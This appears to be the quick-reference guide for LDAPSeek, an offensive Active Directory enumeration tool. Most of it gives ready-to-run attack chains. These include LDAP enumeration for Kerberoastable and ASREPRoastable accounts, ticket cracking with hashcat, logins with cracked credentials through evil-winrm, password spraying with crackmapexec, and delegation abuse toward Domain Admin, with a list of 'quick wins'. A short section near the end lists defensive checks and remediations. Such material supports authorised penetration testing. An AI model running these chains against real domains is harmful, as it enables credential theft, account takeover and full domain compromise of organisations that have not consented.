# LDAPSeek Quick Reference

## Basic Commands

```bash
# Simple scan
./ldapseek.py dclist.txt

# With credentials
./ldapseek.py dclist.txt -u username -p password

# Full enumeration
./ldapseek.py dclist.txt --full -u user -p pass

# Find Kerberoastable accounts
./ldapseek.py dclist.txt --spns -u user -p pass

# Find ASREPRoastable accounts
./ldapseek.py dclist.txt --asrep

# Find admin accounts
./ldapseek.py dclist.txt --admins -u user -p pass

# LDAPS (encrypted)
./ldapseek.py dclist.txt --ldaps -u user -p pass

# JSON output
./ldapseek.py dclist.txt --json -u user -p pass
```

## Common Workflows

```bash
# Full AD attack surface mapping
../dcseek/dcseek.py iplist.txt
./ldapseek.py dclist.txt --full -u user -p pass

# Kerberoasting workflow
./ldapseek.py dclist.txt --spns -u user -p pass
../kerbseek/kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01.corp.local

# ASREPRoasting workflow (no creds needed!)
./ldapseek.py dclist.txt --asrep
../kerbseek/kerbseek.py --asreproast --users asrep_users.txt -d CORP --dc dc01.corp.local

# Password spray preparation
./ldapseek.py dclist.txt --users -u user -p pass
crackmapexec smb iplist.txt -u users.txt -p 'Password123!'
```

## Output Files

| File | Contents |
|------|----------|
| `ldaplist.txt` | Accessible Domain Controllers |
| `users.txt` | All usernames |
| `spns.txt` | Kerberoastable accounts (users with SPNs) |
| `asrep_users.txt` | ASREPRoastable accounts (no preauth) |
| `admin_users.txt` | Privileged accounts |
| `ldap_details.txt` | Full report with UAC analysis |
| `ldap_details.json` | Machine-readable JSON |

## Critical UAC Flags

| Flag | Value | Attack Vector |
|------|-------|---------------|
| `DONT_REQ_PREAUTH` | 0x400000 | **ASREPRoasting** - No password needed! |
| `TRUSTED_FOR_DELEGATION` | 0x80000 | **Unconstrained Delegation** - Impersonate anyone |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | 0x1000000 | **Constrained Delegation** - S4U attacks |
| `DONT_EXPIRE_PASSWORD` | 0x10000 | Password never changes |
| `PASSWD_NOTREQD` | 0x20 | No password required |

## Attack Chains

### Chain 1: LDAP → Kerberoast → WinRM
```bash
# 1. Find Kerberoastable accounts
./ldapseek.py dclist.txt --spns -u user -p pass

# 2. Request TGS tickets
../kerbseek/kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01

# 3. Crack tickets
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# 4. Use cracked creds
evil-winrm -i target -u cracked_user -p cracked_pass
```

### Chain 2: Unauthenticated ASREPRoast
```bash
# 1. Find ASREPRoastable (no creds!)
./ldapseek.py dclist.txt --asrep

# 2. Request AS-REP (no creds!)
../kerbseek/kerbseek.py --asreproast --users asrep_users.txt -d CORP --dc dc01

# 3. Crack AS-REP
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# 4. First foothold!
evil-winrm -i dc01 -u cracked_user -p cracked_pass
```

### Chain 3: Delegation Exploitation
```bash
# 1. Find delegation accounts
./ldapseek.py dclist.txt --full -u user -p pass
grep "TRUSTED_FOR_DELEGATION" ldap_details.txt

# 2. Compromise delegation account

# 3. Extract TGT for Domain Admin
# Use Rubeus or Mimikatz

# 4. Pass-the-ticket to DC
```

## Enumeration Types

```bash
# Domain info only
./ldapseek.py dclist.txt

# All users
./ldapseek.py dclist.txt --users -u user -p pass

# All groups
./ldapseek.py dclist.txt --groups -u user -p pass

# All computers
./ldapseek.py dclist.txt --computers -u user -p pass

# SPNs only
./ldapseek.py dclist.txt --spns -u user -p pass

# ASREPRoastable only
./ldapseek.py dclist.txt --asrep -u user -p pass

# Admins only
./ldapseek.py dclist.txt --admins -u user -p pass

# Everything
./ldapseek.py dclist.txt --full -u user -p pass
```

## Privileged Groups

LDAPSeek automatically identifies members of:
- **Domain Admins**
- **Enterprise Admins**
- **Schema Admins**
- **Administrators**
- **Backup Operators**
- **Account Operators**
- **Server Operators**
- **Print Operators**
- **DNSAdmins**
- **Group Policy Creator Owners**
- **Hyper-V Administrators**
- **Remote Desktop Users**

## Filtering Results

```bash
# Find service accounts
grep "svc_\|service" users.txt

# Find disabled accounts
grep "ACCOUNTDISABLE" ldap_details.txt

# Find accounts with no password expiry
grep "DONT_EXPIRE_PASSWORD" ldap_details.txt

# Find admin accounts
cat admin_users.txt

# Find delegation issues
grep "DELEGATION" ldap_details.txt

# Find accounts without preauth
cat asrep_users.txt

# Find Kerberoastable accounts
cat spns.txt
```

## Integration Examples

### With KerbSeek
```bash
# Get targets
./ldapseek.py dclist.txt --spns -u user -p pass

# Attack
../kerbseek/kerbseek.py --kerberoast --spns spns.txt -d CORP --dc dc01
```

### With CredSeek
```bash
# Find GPP passwords
../credseek/credseek.py --gpp dclist.txt -u user -p pass

# Use GPP creds for LDAP
./ldapseek.py dclist.txt --full -u gpp_admin -p gpp_pass
```

### With CrackMapExec
```bash
# Get usernames
./ldapseek.py dclist.txt --users -u user -p pass

# Password spray
crackmapexec smb iplist.txt -u users.txt -p 'Password123!' --continue-on-success
```

## Common Issues

### Anonymous Bind Denied
```bash
# Use valid credentials
./ldapseek.py dclist.txt -u username -p password
```

### No Results
```bash
# Check LDAP connectivity
ldapsearch -x -H ldap://dc01 -b "" -s base

# Specify base DN
./ldapseek.py dclist.txt --base "DC=corp,DC=local"
```

### Slow Performance
```bash
# Reduce threads
./ldapseek.py dclist.txt --threads 3

# Query specific data
./ldapseek.py dclist.txt --spns  # Instead of --full
```

## LDAP Filters

LDAPSeek uses these filters:

```bash
# All users
(&(objectClass=user)(objectCategory=person))

# Users with SPNs (Kerberoastable)
(&(objectClass=user)(servicePrincipalName=*))

# Users without preauth (ASREPRoastable)
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Admin accounts
(|(adminCount=1)(memberOf=CN=Domain Admins,...))

# Delegation accounts
(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216))
```

## UAC Flag Quick Reference

```
Common Flags:
0x2      - ACCOUNTDISABLE (disabled account)
0x10     - LOCKOUT (locked out)
0x20     - PASSWD_NOTREQD (no password)
0x200    - NORMAL_ACCOUNT (standard user)
0x10000  - DONT_EXPIRE_PASSWORD (never expires)
0x80000  - TRUSTED_FOR_DELEGATION (unconstrained)
0x100000 - NOT_DELEGATED (protected)
0x400000 - DONT_REQ_PREAUTH (ASREPRoastable!)
0x1000000 - TRUSTED_TO_AUTH_FOR_DELEGATION (constrained)
```

## Defense Checks

```bash
# Check for ASREPRoast vulnerability
./ldapseek.py dclist.txt --asrep -u user -p pass
# Remediation: Remove DONT_REQ_PREAUTH flag

# Check for weak service accounts
./ldapseek.py dclist.txt --spns -u user -p pass
# Remediation: Use gMSA with strong passwords

# Check for unconstrained delegation
grep "TRUSTED_FOR_DELEGATION" ldap_details.txt
# Remediation: Only DCs should have this

# Check for over-privileged accounts
cat admin_users.txt
# Remediation: Remove unnecessary admin access
```

## Tips

✅ **Try anonymous bind first** - May work in older domains  
✅ **Use --full for complete picture** - Don't miss anything  
✅ **Save JSON output** - Easier to parse and analyze  
✅ **Check UAC flags carefully** - Many attack vectors  
✅ **Follow up with KerbSeek** - LDAP finds targets, Kerberos attacks them  
✅ **Look for service accounts** - Often have weak passwords  
✅ **Check delegation** - Critical privilege escalation path  

## Quick Wins

1. **ASREPRoastable accounts** - Attack without credentials!
2. **Service accounts with SPNs** - Kerberoast and crack
3. **Unconstrained delegation** - Domain Admin via TGT extraction
4. **Accounts with DONT_EXPIRE_PASSWORD** - Password spray targets
5. **Service accounts in admin groups** - High-value targets

---

**Quick Start:** `./ldapseek.py dclist.txt --full -u user -p pass`  
**Most Common:** `./ldapseek.py dclist.txt --spns -u user -p pass`  
**Full Docs:** See README.md
